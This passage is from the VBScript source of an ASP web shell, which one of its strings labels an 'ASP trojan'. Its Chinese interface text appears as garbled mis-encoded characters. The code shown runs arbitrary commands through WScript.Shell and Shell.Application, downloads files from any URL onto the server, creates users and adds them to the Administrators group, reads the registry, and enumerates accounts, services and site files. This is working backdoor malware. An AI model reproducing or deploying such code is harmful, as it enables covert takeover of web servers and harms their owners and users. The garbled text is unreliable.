           echo "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\Dont-DisplayLastUserName,REG_SZ,1 {²»ÏÔÊ¾ÉÏ´ÎµÇÂ¼ÓÃ»§}<br/>"
           echo "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\restrictanonymous,REG_DWORD,0 {0=È±Ê¡,1=ÄäÃûÓÃ»§ÎÞ·¨ÁÐ¾Ù±¾»úÓÃ»§ÁÐ±í,2=ÄäÃûÓÃ»§ÎÞ·¨Á¬½Ó±¾»úIPC$¹²Ïí}<br/>"
           echo "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer,REG_DWORD,0 {½ûÖ¹Ä¬ÈÏ¹²Ïí}<br/>"
           echo "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\EnableSharedNetDrives,REG_SZ,0 {¹Ø±ÕÍøÂç¹²Ïí}<br/>"
           echo "HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters,REG_DWORD,1 {ÆôÓÃTCP/IPÉ¸Ñ¡(ËùÓÐÊÔÅäÆ÷)}<br/>"
           echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\IPEnableRouter,REG_DWORD,1 {ÔÊÐíIPÂ·ÓÉ}<br/>"
           echo "-------ÒÔÏÂËÆºõÒª¿´°ó¶¨µÄÍø¿¨,²»ÖªµÀÊÇ·ñ×¼È·---------<br/>"
           echo "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\DefaultGateway,REG_MUTI_SZ {Ä¬ÈÏÍø¹Ø}<br/>"
           echo "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\NameServer {Ê×DNS}<br/>"
           echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts {ÔÊÐíµÄTCP/IP¶Ë¿Ú}<br/>"
           echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts {ÔÊÐíµÄUDP¶Ë¿Ú}<br/>"
           echo "-----------OVER--------------------<br/>"
           echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count {¹²¼¸¿é»î¶¯Íø¿¨}<br/>"
           echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind {µ±Ç°Íø¿¨µÄÐòÁÐ(°ÑÉÏÃæµÄÌæ»»)}<br/>"
           echo "==========================================================<br/>ÒÔÉÏ×ÊÁÏÓÉkEvin1986Ìá¹©"
           echo "</span>"
           echo "</form><hr/>"

           echo "<script language=vbs>" & vbNewLine
           echo "sub main()" & vbNewLine
           echo "base=document.all.text9.value" & vbNewLine
           echo "If IsNumeric(base) Then" & vbNewLine
           echo "cc=hex(cstr(base))" & vbNewLine
           echo "alert(""10½øÖÆÎª""&base)" & vbNewLine
           echo "alert(""16½øÖÆÎª""&cc)" & vbNewLine
           echo "exit sub" & vbNewLine
           echo "end if" & vbNewLine
           echo "aa=asc(cstr(base))" & vbNewLine
           echo "bb=hex(aa)" & vbNewLine
           echo "alert(""10½øÖÆÎª""&aa)" & vbNewLine
           echo "alert(""16½øÖÆÎª""&bb)" & vbNewLine
           echo "end sub" & vbNewLine
           echo "sub main2()" & vbNewLine
           echo "If document.all.vars.value<>"""" Then" & vbNewLine
           echo "Dim nums,tmp,tmpstr,i" & vbNewLine
           echo "nums=document.all.vars.value" & vbNewLine
           echo "nums_len=Len(nums)" & vbNewLine
           echo "For i=1 To nums_len" & vbNewLine
           echo "tmp=Mid(nums,i,1)" & vbNewLine
           echo "If IsNumeric(tmp) Then" & vbNewLine
           echo "tmp=tmp * 16 * (16^(nums_len-i-1))" & vbNewLine
           echo "Else" & vbNewLine
           echo "If ASC(UCase(tmp))<65 Or ASC(UCase(tmp))>70 Then" & vbNewLine
           echo "alert(""ÄãÊäÈëµÄÊýÖµÖÐÓÐ·Ç·¨×Ö·û£¬16½øÖÆÊýÖ»°üÀ¨1¡«9¼°a¡«fÖ®¼äµÄ×Ö·û£¬ÇëÖØÐÂÊäÈë¡£"")" & vbNewLine
           echo "exit sub" & vbNewLine
           echo "End If" & vbNewLine
           echo "tmp=(ASC(UCase(tmp))-55) * (16^(nums_len-i))" & vbNewLine
           echo "End If" & vbNewLine
           echo "tmpstr=tmpstr+tmp" & vbNewLine
           echo "Next" & vbNewLine
           echo "alert(""×ª»»µÄ10½øÖÆÎª:""&tmpstr&""Æä×Ö·ûÖµÎª:""&chr(tmpstr))" & vbNewLine
           echo "End If" & vbNewLine
           echo "end sub" & vbNewLine
           echo "</script>" & vbNewLine

           echo "Powered By Marcos 2005.02"
       End Sub

       Sub downFromUrl()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim Http, theUrl, thePath, stream, fileName, overWrite
           theUrl = Request("theUrl")
           thePath = Request("thePath")
           overWrite = Request("overWrite")
           Set stream = Server.CreateObject("Adodb.Stream")
           Set Http = Server.CreateObject("MSXML2.XMLHTTP")

           If overWrite <> 2 Then
               overWrite = 1
           End If

           Http.Open "GET", theUrl, False
           Http.Send()
           If Http.ReadyState <> 4 Then
               Exit Sub
           End If

           With stream
               .Type = 1
               .Mode = 3
               .Open
               .Write Http.ResponseBody
               .Position = 0
               .SaveToFile thePath, overWrite
               If Err.Number = 3004 Then
                   Err.Clear
                   fileName = Split(theUrl, "/")(UBound(Split(theUrl, "/")))
                   If fileName = "" Then
                       fileName = "index.htm.txt"
                   End If
                   thePath = thePath & "\" & fileName
                   .SaveToFile thePath, overWrite
               End If
               .Close
           End With
           chkErr(Err)

           alertThenClose("ÎÄ¼þ " & Replace(thePath, "\", "\\") & " ÏÂÔØ³É¹¦!")

           Set Http = Nothing
           Set Stream = Nothing
       End Sub

       Sub AddUser(strUser, strPassword)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim computer, theUser, theGroup
           Set computer = Getobject("WinNT://.")
           Set theGroup = GetObject("WinNT://./Administrators,group")

           Set theUser = computer.Create("User", strUser)
           theUser.SetPassword(strPassword)
           chkErr(Err)
           theUser.SetInfo
           chkErr(Err)
           theGroup.Add theUser
           chkErr(Err)

           Set theUser = Nothing
           Set computer = Nothing
           Set theGroup = Nothing

           echo getUserInfo(strUser)
       End Sub

       Sub readReg()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim i, thePath, theArray
           thePath = Request("thePath")
   '       echo thePath & "<br/>"
           theArray = wsX.RegRead(thePath)
           If IsArray(theArray) Then
               For i = 0 To UBound(theArray)
                   echo "<li>" & theArray(i)
               Next
            Else
               echo "<li>" & theArray
           End If
           chkErr(Err)
       End Sub

       Sub PageList()
           showTitle("¹¦ÄÜÄ£¿éÁÐ±í")

           echo "<base target=_blank>"
           echo "º£Ñô¶¥¶ËÍøASPÄ¾Âí@2006<hr/>"
           echo "<ol><li><a href='?pageName=ServiceList'>ÏµÍ³·þÎñÐÅÏ¢</a></li>"
           echo "<br/>"
           echo "<li><a href='?pageName=infoAboutSrv'>·þÎñÆ÷Ïà¹ØÊý¾Ý</a><br/>("
           echo "<a href='?pageName=infoAboutSrv&theAct=getSrvInfo'>ÏµÍ³²ÎÊý</a>,"
           echo "<a href='?pageName=infoAboutSrv&theAct=getSrvDrvInfo'>ÏµÍ³´ÅÅÌ</a>,"
           echo "<a href='?pageName=infoAboutSrv&theAct=getSiteRootInfo'>Õ¾µãÎÄ¼þ¼Ð</a>,"
           echo "<a href='?pageName=infoAboutSrv&theAct=getTerminalInfo'>ÖÕ¶Ë¶Ë¿Ú&×Ô¶¯µÇÂ¼</a>)</li>"
           echo "<li><a href='?pageName=objOnSrv'>·þÎñÆ÷×é¼þÌ½Õë</a></li>"
           echo "<li><a href='?pageName=userList'>ÏµÍ³ÓÃ»§¼°ÓÃ»§×éÐÅÏ¢</a></li>"
           echo "<li><a href='?pageName=CSInfo'>¿Í»§¶Ë·þÎñÆ÷½»»¥ÐÅÏ¢</a></li>"
           echo "<li><a href='?pageName=WsCmdRun'>WScript.Shell³ÌÐòÔËÐÐÆ÷</a></li>"
           echo "<li><a href='?pageName=SaCmdRun'>Shell.Application³ÌÐòÔËÐÐÆ÷</a></li>"
           echo "<li><a href='?pageName=FsoFileExplorer'>FSOÎÄ¼þä¯ÀÀ²Ù×÷Æ÷</a></li>"
           echo "<li><a href='?pageName=AppFileExplorer'>Shell.ApplicationÎÄ¼þä¯ÀÀ²Ù×÷Æ÷</a></li>"
           echo "<li><a href='?pageName=MsDataBase'>Î¢ÈíÊý¾Ý¿â²é¿´/²Ù×÷Æ÷</a></li>"
           echo "<li><a href='?pageName=PageAddToMdb'>ÎÄ¼þ¼Ð´ò°ü/½â¿ªÆ÷</a></li>"
           echo "<li><a href='?pageName=TxtSearcher'>ÎÄ±¾ÎÄ¼þËÑË÷Æ÷</a></li>"
           echo "<li><a href='?pageName=OtherTools'>Ò»Ð©ÁãËéµÄÐ¡¶«Î÷</a></li>"
           echo "</ol>"
           echo "<hr/>Powered By Marcos 2005.02"
       End Sub

       Sub PageSaCmdRun()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim theFile, thePath, theAct, appPath, appName, appArgs

           showTitle("Shell.ApplicationÃüÁîÐÐ²Ù×÷")

           theAct = Trim(Request("theAct"))
           appPath = Trim(Request("appPath"))
           thePath = Trim(Request("thePath"))
           appName = Trim(Request("appName"))
           appArgs = Trim(Request("appArgs"))

           If theAct = "doAct" Then
               If appName = "" Then
                   appName = "cmd.exe"
               End If

               If appPath <> "" And Right(appPath, 1) <> "\" Then
                   appPath = appPath & "\"
               End If

               If LCase(appName) = "cmd.exe" And appArgs <> "" Then
                   If LCase(Left(appArgs, 2)) <> "/c" Then
                       appArgs = "/c " & appArgs
                   End If
               Else
                   If LCase(appName) = "cmd.exe" And appArgs = "" Then
                       appArgs = "/c "
                   End If
               End If

               saX.ShellExecute appName, appArgs, appPath, "", 0
               chkErr(Err)
           End If

           If theAct = "readResult" Then
               Err.Clear
               echo encode(streamLoadFromFile(aspPath))
               If Err Then
                   Set theFile = fsoX.OpenTextFile(aspPath)
                   echo encode(theFile.ReadAll())
                   Set theFile = Nothing
               End If
               Response.End
           End If

           echo "<style>body{margin:8;border:none;background-color:buttonface;}</style>"
           echo "<body onload=""document.forms[0].appArgs.focus();setTimeout('wsLoadIFrame();', 3900);"">"
           echo "<form method=post onSubmit='this.Submit.disabled=true'>"
           echo "<input type=hidden name=theAct value=doAct>"
           echo "<input type=hidden name=aspPath value=""" & HtmlEncode(aspPath) & """>"
           echo "ËùÔÚÂ·¾¶: <input name=appPath type=text id=appPath value=""" & HtmlEncode(appPath) & """ size=62><br/>"
           echo "³ÌÐòÎÄ¼þ: <input name=appName type=text id=appName value=""" & HtmlEncode(appName) & """ size=62> "
           echo "<input type=button name=Submit4 value=' »ØÏÔ ' onClick=""this.form.appArgs.value+=' > '+this.form.aspPath.value;""><br/> "
           echo "ÃüÁî²ÎÊý: <input name=appArgs type=text id=appArgs value=""" & HtmlEncode(appArgs) & """ size=62> "
           echo "<input type=submit name=Submit value=' ÔËÐÐ '><br/>"
           echo "<hr/>×¢: Ö»ÓÐÃüÁîÐÐ³ÌÐòÔÚCMD.EXEÔËÐÐ»·¾³ÏÂ²Å¿ÉÒÔ½øÐÐÁÙÊ±ÎÄ¼þ»ØÏÔ(ÀûÓÃ"">""·ûºÅ),ÆäËü³ÌÐòÖ»ÄÜÖ´ÐÐ²»ÄÜ»ØÏÔ.<br/>"
           echo "¡¡&nbsp; ÓÉÓÚÃüÁîÖ´ÐÐÊ±¼äÍ¬ÍøÒ³Ë¢ÐÂÊ±¼ä²»Í¬²½,ËùÒÔÓÐÐ©Ö´ÐÐÊ±¼ä³¤µÄ³ÌÐò½á¹ûÐèÒªÊÖ¶¯Ë¢ÐÂÏÂÃæµÄiframe²ÅÄÜµÃµ½.»ØÏÔºó¼ÇµÃÉ¾³ýÁÙÊ±ÎÄ¼þ.<hr/>"
           echo "<iframe id=cmdResult style='width:100%;height:78%;'>"
           echo "</iframe>"
           echo "</form>"
           echo "</body>"
       End Sub

       Sub PageServiceList()
           Dim sa, objService, objComputer

           showTitle("ÏµÍ³·þÎñÐÅÏ¢²é¿´")
           Set objComputer = GetObject("WinNT://.")
           Set sa = Server.CreateObject("Shell.Application")
           objComputer.Filter = Array("Service")

           echo "<ol>"
           If isDebugMode = False Then
               On Error Resume Next
           End If
           For Each objService In objComputer
               echo "<li>" & objService.Name & "</li><hr/>"
               echo "<ol>·þÎñÃû³Æ: " & objService.Name & "<br/>"
               echo "ÏÔÊ¾Ãû³Æ: " & objService.DisplayName & "<br/>"
               echo "Æô¶¯ÀàÐÍ: " & getStartType(objService.StartType) & "<br/>"
               echo "ÔËÐÐ×´Ì¬: " & sa.IsServiceRunning(objService.Name) & "<br/>"
   '           echo "µ±Ç°×´Ì¬: " & objService.Status & "<br/>"
   '           echo "·þÎñÀàÐÍ: " & objService.ServiceType & "<br/>"
               echo "µÇÂ¼Éí·Ý: " & objService.ServiceAccountName & "<br/>"
               echo "·þÎñÃèÊö: " & getServiceDsc(objService.Name) & "<br/>"
               echo "ÎÄ¼þÂ·¾¶¼°²ÎÊý: " & objService.Path
               echo "</ol><hr/>"
           Next
           echo "</ol><hr/>Powered By Marcos 2005.02"

           Set sa = Nothing
       End Sub

       Function getServiceDsc(strService)
           Dim ws
           Set ws = Server.CreateObject("WScript.Shell")
           getServiceDsc = ws.RegRead("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\" & strService & "\Description")
           Set ws = Nothing
       End Function

       Sub PageTxtSearcher()
           Response.Buffer = True
           Server.ScriptTimeOut = 5000
           Dim keyword, theAct, thePath, theFolder
           theAct = Request("theAct")
           keyword = Trim(Request("keyword"))
           thePath = Trim(Request("thePath"))

           showTitle("ÎÄ±¾ÎÄ¼þËÑË÷Æ÷")

           If thePath = "" Then
               thePath = Server.MapPath("\")
           End If

           echo "FSOÎÄ¼þËÑË÷:"
           echo "<hr/>"
           echo "<form name=form1 method=post action=?pageName=TxtSearcher&theAct=fsoSearch onsubmit=this.Submit.disabled=true>"
           echo "Â·¾¶: <input name=thePath type=text value=""" & HtmlEncode(thePath) & """ id=thePath size=61><br/>"
           echo "¹Ø¼ü×Ö: <input name=keyword type=text value=""" & HtmlEncode(keyword) & """ id=keyword size=60>"
           echo "<input type=submit name=Submit value=¸øÎÒËÑ>"
           echo "</form>"
           echo "<hr/>"
           echo "Shell.Application &amp; Adodb.StreamÎÄ¼þËÑË÷:"
           echo "<hr/>"
           echo "<form name=form1 method=post action=?pageName=TxtSearcher&theAct=saSearch onsubmit=this.Submit2.disabled=true>"
           echo "Â·¾¶: <input name=thePath type=text value=""" & HtmlEncode(thePath) & """ id=thePath size=61><br/>"
           echo "¹Ø¼ü×Ö: <input name=keyword type=text value=""" & HtmlEncode(keyword) & """ id=keyword size=60>"
           echo "<input type=submit name=Submit2 value=¸øÎÒËÑ>"
           echo "</form>"
           echo "<hr/>"

           If theAct = "fsoSearch" And keyword <> "" Then
               Set theFolder = fsoX.GetFolder(thePath)
               Call searchFolder(theFolder, keyword)
               Set theFolder = Nothing
           End If

           If theAct = "saSearch" And keyword <> "" Then
               Call appSearchIt(thePath, keyword)
           End If

           echo "<hr/>Powered By Marcos 2005.02"
       End Sub

       Sub searchFolder(folder, str)
           Dim ext, title, theFile, theFolder
           For Each theFile In folder.Files
               ext = LCase(Split(theFile.Path, ".")(UBound(Split(theFile.Path, "."))))
               If InStr(LCase(theFile.Name), LCase(str)) > 0 Then
                   echo fileLink(theFile, "")
               End If
               If ext = "asp" Or ext = "asa" Or ext = "cer" Or ext = "cdx" Then
                   If searchFile(theFile, str, title, "fso") Then
                       echo fileLink(theFile, title)
                   End If
               End If
           Next
           Response.Flush()
           For Each theFolder In folder.subFolders
               searchFolder theFolder, str
           Next
       end sub

       Function searchFile(f, s, title, method)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim theFile, content, pos1, pos2

           If method = "fso" Then
               Set theFile = fsoX.OpenTextFile(f.Path)
               content = theFile.ReadAll()
               theFile.Close
               Set theFile = Nothing
            Else
               content = streamLoadFromFile(f.Path)
           End If

           If Err Then
               Err.Clear
               content = ""
           End If

           searchFile = InStr(1, content, S, vbTextCompare) > 0
           If searchFile Then
               pos1 = InStr(1, content, "<TITLE>", vbTextCompare)
               pos2 = InStr(1, content, "</TITLE>", vbTextCompare)
               title = ""
               If pos1 > 0 And pos2 > 0 Then
                   title = Mid(content, pos1 + 7, pos2 - pos1 - 7)
               End If
           End If
       End Function

       Function fileLink(f, title)
           fileLink = f.Path
           If title = "" Then
               title = f.Name
           End If
           fileLink = "<li><font color=ff0000>" & title & "</font> " & fileLink & "</li>"
       End Function

       Sub appSearchIt(thePath, theKey)
           Dim title, extName, objFolder, objItem, fileName
           Set objFolder = saX.NameSpace(thePath)

           For Each objItem In objFolder.Items
               If objItem.IsFolder = True Then
                   Call appSearchIt(objItem.Path, theKey)
                   Response.Flush()
                Else
                   extName = LCase(Split(objItem.Path, ".")(UBound(Split(objItem.Path, "."))))
                   fileName = Split(objItem.Path, "\")(UBound(Split(objItem.Path, "\")))
                   If InStr(LCase(fileName), LCase(theKey)) > 0 Then
                       echo fileLink(objItem, "")
                   End If
                   If extName = "asp" Or extName = "asa" Or extName = "cer" Or extName = "cdx" Then
                       If searchFile(objItem, theKey, title, "application") Then
                           echo fileLink(objItem, title)
                       End If
                   End If
               End If
           Next
       End Sub

       Sub PageUserList()
           Dim objUser, objGroup, objComputer

           showTitle("ÏµÍ³ÓÃ»§¼°ÓÃ»§×éÐÅÏ¢²é¿´")
           Set objComputer = GetObject("WinNT://.")
           objComputer.Filter = Array("User")
           echo "<a href=javascript:showHideMe(userList);>User:</a>"
           echo "<span id=userList><hr/>"
           For Each objUser in objComputer
               echo "<li>" & objUser.Name & "</li>"
               echo "<ol><hr/>"
               getUserInfo(objUser.Name)
               echo "<hr/></ol>"
           Next
           echo "</span>"

           echo "<br/><a href=javascript:showHideMe(userGroupList);>UserGroup:</a>"
           echo "<span id=userGroupList><hr/>"
           objComputer.Filter = Array("Group")
           For Each objGroup in objComputer
               echo "<li>" & objGroup.Name & "</li>"
               echo "<ol><hr/>" & objGroup.Description & "<hr/></ol>"
           Next
           echo "</span><hr/>Powered By Marcos 2005.02"

       End Sub

       Sub getUserInfo(strUser)
           Dim User, Flags
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Set User = GetObject("WinNT://./" & strUser & ",user")
           echo "ÃèÊö: " & User.Description & "<br/>"
           echo "ËùÊôÓÃ»§×é: " & getItsGroup(strUser) & "<br/>"
           echo "ÃÜÂëÒÑ¹ýÆÚ: " & cbool(User.Get("PasswordExpired")) & "<br/>"
           Flags = User.Get("UserFlags")
           echo "ÃÜÂëÓÀ²»¹ýÆÚ: " & cbool(Flags And &H10000) & "<br/>"
           echo "ÓÃ»§²»ÄÜ¸ü¸ÄÃÜÂë: " & cbool(Flags And &H00040) & "<br/>"
           echo "·ÇÈ«¾ÖÕÊºÅ: " & cbool(Flags And &H100) & "<br/>"
           echo "ÃÜÂëµÄ×îÐ¡³¤¶È: " & User.PasswordMinimumLength & "<br/>"
           echo "ÊÇ·ñÒªÇóÓÐÃÜÂë: " & User.PasswordRequired & "<br/>"
           echo "ÕÊºÅÍ£ÓÃÖÐ: " & User.AccountDisabled & "<br/>"
           echo "ÕÊºÅËø¶¨ÖÐ: " & User.IsAccountLocked & "<br/>"
           echo "ÓÃ»§ÐÅÏ¢ÎÄ¼þ: " & User.Profile & "<br/>"
           echo "ÓÃ»§µÇÂ¼½Å±¾: " & User.LoginScript & "<br/>"
           echo "ÓÃ»§HomeÄ¿Â¼: " & User.HomeDirectory & "<br/>"
           echo "ÓÃ»§HomeÄ¿Â¼¸ù: " & User.Get("HomeDirDrive") & "<br/>"
           echo "ÕÊºÅ¹ýÆÚÊ±¼ä: " & User.AccountExpirationDate & "<br/>"
           echo "ÕÊºÅÊ§°ÜµÇÂ¼´ÎÊý: " & User.BadLoginCount & "<br/>"
           echo "ÕÊºÅ×îºóµÇÂ¼Ê±¼ä: " & User.LastLogin & "<br/>"
           echo "ÕÊºÅ×îºó×¢ÏúÊ±¼ä: " & User.LastLogoff & "<br/>"
           For Each RegTime In User.LoginHours
               If RegTime < 255 Then
                   Restrict = True
               End If
           Next
           echo "ÕÊºÅÒÑÓÃÊ±¼ä: " & Restrict & "<br/>"
           Err.Clear
       End Sub

       Function getItsGroup(strUser)
           Dim objUser, objGroup
           Set objUser = GetObject("WinNT://./" & strUser & ",user")
           For Each objGroup in objUser.Groups
               getItsGroup = getItsGroup & " " & objGroup.Name
           Next
       End Function

       Sub PageWsCmdRun()
           Dim cmdStr, cmdPath, cmdResult
           cmdStr = Request("cmdStr")
           cmdPath = Request("cmdPath")

           showTitle("WScript.ShellÃüÁîÐÐ²Ù×÷")

           If cmdPath = "" Then
               cmdPath = "cmd.exe"
           End If

           If cmdStr <> "" Then
               If InStr(LCase(cmdPath), "cmd.exe") > 0 Or InStr(LCase(cmdPath), LCase(myCmdDotExeFile)) > 0 Then
                   cmdResult = doWsCmdRun(cmdPath & " /c " & cmdStr)
                Else
                   If LCase(cmdPath) = "wscriptshell" Then
                       cmdResult = doWsCmdRun(cmdStr)
                    Else
                       cmdResult = doWsCmdRun(cmdPath & " " & cmdStr)
                   End If
               End If
           End If

           echo "<style>body{margin:8;}</style>"
           echo "<body onload=""document.forms[0].cmdStr.focus();document.forms[0].cmdResult.style.height=document.body.clientHeight-115;"">"
           echo "<form method=post onSubmit='this.Submit.disabled=true'>"
           echo "Â·¾¶: <input name=cmdPath type=text id=cmdPath value=""" & HtmlEncode(cmdPath) & """ size=50> "
           echo "<input type=button name=Submit2 value=Ê¹ÓÃWScript.Shell onClick=""this.form.cmdPath.value='WScriptShell';""><br/>"
           echo "ÃüÁî/²ÎÊý: <input name=cmdStr type=text id=cmdStr value=""" & HtmlEncode(cmdStr) & """ size=62> "
           echo "<input type=submit name=Submit value=' ÔËÐÐ '><br/>"
           echo "<hr/>×¢: ÇëÖ»ÔÚÕâÀïÖ´ÐÐµ¥²½³ÌÐò(³ÌÐòÖ´ÐÐ¿ªÊ¼µ½½áÊø²»ÐèÒªÈË¹¤¸ÉÔ¤),²»È»±¾³ÌÐò»áÎÞ·¨Õý³£¹¤×÷,²¢ÇÒÔÚ·þÎñÆ÷Éú³ÉÒ»¸ö²»¿É½áÊøµÄ½ø³Ì.<hr/>"
           echo "<textarea id=cmdResult style='width:100%;height:78%;'>"
           echo HtmlEncode(cmdResult)
           echo "</textarea>"
           echo "</form>"
           echo "</body>"
       End Sub

       Function doWsCmdRun(cmdStr)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim fso, theFile
           Set fso = Server.CreateObject("Scripting.FileSystemObject")

           doWsCmdRun = wsX.Exec(cmdStr).StdOut.ReadAll()
           If Err Then
               echo Err.Description & "<br>"
               Err.Clear
               wsX.Run cmdStr & " > " & aspPath, 0, True
               Set theFile = fso.OpenTextFile(aspPath)
               doWsCmdRun = theFile.RealAll()
               If Err Then
                   echo Err.Description & "<br>"
                   Err.Clear
                   doWsCmdRun = streamLoadFromFile(aspPath)
               End If
           End If

           Set fso = Nothing
       End Function

       Sub PageOther()
           echo "<style>"
           echo "A:visited {color: #333333;text-decoration: none;}"
           echo "A:active {color: #333333;text-decoration: none;}"
           echo "A:link {color: #000000;text-decoration: none;}"
           echo "A:hover {color: #333333;text-decoration: none;}"
           echo "BODY {font-size: 9pt;COLOR: #000000;font-family: ""Courier New"";border: none;background-color: buttonface;}"
           echo "textarea {font-family: ""Courier New"";font-size: 12px;border-width: 1px;color: #000000;}"
           echo "table {font-size: 9pt;}"
           echo "form {margin: 0;}"
           echo "#fsoDriveList span{width: 100px;}"
           echo "#FileList span{width: 90;height: 70;cursor: hand;text-align: center;word-break: break-all;border: 1px solid buttonface;}"
           echo ".anotherSpan{color: #ffffff;width: 90;height: 70;text-align: center;background-color: #0A246A;border: 1px solid #0A246A;}"
           echo ".font{font-size: 35px;line-height: 40px;}"
           echo "#fileExplorerTools {background-color: buttonFace;}"
           echo ".input, input {border-width: 1px;}"
           echo "</style>" & vbNewLine

           echo "<script language=javascript>" & vbNewLine
           echo "function showHideMe(me){" & vbNewLine
           echo "if(me.innerText == ''){" & vbNewLine
           echo "me.innerText = '\nNo Contents!';" & vbNewLine
           echo "}" & vbNewLine
           echo "if(me.style.display == 'none'){" & vbNewLine
           echo "me.style.display = '';" & vbNewLine
           echo "}else{" & vbNewLine
           echo "me.style.display = 'none';" & vbNewLine
           echo "}" & vbNewLine
           echo "}" & vbNewLine
           echo "function changeMyClass(me){" & vbNewLine
           echo "if(me.className == ''){" & vbNewLine
           echo "if(usePath.value != '')document.getElementById(usePath.value).className = '';" & vbNewLine
           echo "usePath.value = me.id;" & vbNewLine
           echo "status = me.title;" & vbNewLine
           echo "me.className = 'anotherSpan';" & vbNewLine
           echo "}" & vbNewLine
           echo "}" & vbNewLine
           echo "function changeThePath(me){" & vbNewLine
           echo "location.href = '?pageName=' + pageName.value + '&thePath=' + me.id;" & vbNewLine
           echo "}" & vbNewLine
           echo "function fixTheLayer(strObj){" & vbNewLine
           echo "var objStyle=document.getElementById(strObj).style;" & vbNewLine
           echo "objStyle.width = document.body.clientWidth;" & vbNewLine
           echo "objStyle.top = document.body.scrollTop + 2;" & vbNewLine
           echo "}" & vbNewLine
           echo "function openUrl(){" & vbNewLine
           echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=openUrl&thePath=' + usePath.value);" & vbNewLine
           echo "}" & vbNewLine
           echo "function newOne(){" & vbNewLine
           echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=newOne&thePath=' + truePath.value, '', 'menu=no,resizable=yes,height=110,width=300');" & vbNewLine
           echo "}" & vbNewLine
           echo "function editFile(){" & vbNewLine
           echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=showEdit&thePath=' + usePath.value, '', 'menu=no,resizable=yes');" & vbNewLine
           echo "}" & vbNewLine
           echo "function appDoAction(act){" & vbNewLine
           echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=' + act + '&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine
           echo "}" & vbNewLine
           echo "function downTheFile(){" & vbNewLine
           echo "if(confirm('Èç¹û¸ÃÎÄ¼þ³¬¹ý20M,\n½¨Òé²»ÒªÍ¨¹ýÁ÷·½Ê½ÏÂÔØ\nÕâÑù»áÕ¼ÓÃ·þÎñÆ÷´óÁ¿µÄ×ÊÔ´\n²¢¿ÉÄÜµ¼ÖÂ·þÎñÆ÷ËÀ»ú!\nÄú¿ÉÒÔÏÈ°ÑÎÄ¼þ¸´ÖÆµ½µ±Ç°Õ¾µãÄ¿Â¼ÏÂ,\nÈ»ºóÍ¨¹ýhttpÐÒéÀ´ÏÂÔØ.\n°´\""È·¶¨\""ÓÃÁ÷À´½øÐÐÏÂÔØ.')){" & vbNewLine
           echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=downTheFile&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine
           echo "}" & vbNewLine
           echo "}" & vbNewLine
           echo "function appDoAction2(act){" & vbNewLine
           echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=' + act + '&thePath=' + truePath.value, '','menu=no,resizable=yes,height=100,width=368');" & vbNewLine
           echo "}" & vbNewLine
           echo "function appTheAttributes(){" & vbNewLine
           echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=theAttributes&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=194,width=368');" & vbNewLine
           echo "}" & vbNewLine
           echo "function appRename(){" & vbNewLine
           echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=rename&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine
           echo "}" & vbNewLine
           echo "function upTheFile(){" & vbNewLine
           echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=showUpload&thePath=' + truePath.value, '', 'menu=no,resizable=yes,height=80,width=380');" & vbNewLine
           echo "}" & vbNewLine
           echo "function wsLoadIFrame(){" & vbNewLine
           echo "cmdResult.location.href = '?pageName=SaCmdRun&theAct=readResult';" & vbNewLine
           echo "}" & vbNewLine
           echo "function fsoRename(){" & vbNewLine
           echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=showFsoRename&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=20,width=300');" & vbNewLine
           echo "}" & vbNewLine
           echo "function delOne(){" & vbNewLine
           echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=delOne&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine
           echo "}" & vbNewLine
           echo "function fsoGetAttributes(){" & vbNewLine
           echo "newWin = window.open('?pageName=' + pageName.value + '&theAct=getAttributes&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=170,width=300');" & vbNewLine
           echo "}" & vbNewLine
           echo "</script>"
       End Sub

       Sub openUrl(usePath)
           Dim theUrl, thePath

           thePath = Server.MapPath("/")

           If LCase(Left(usePath, Len(thePath))) = LCase(thePath) Then
               theUrl = Mid(usePath, Len(thePath) + 1)
               theUrl = Replace(theUrl, "\", "/")
               If Left(theUrl, 1) = "/" Then
                   theUrl = Mid(theUrl, 2)
               End If
               Response.Redirect("/" & theUrl)
            Else
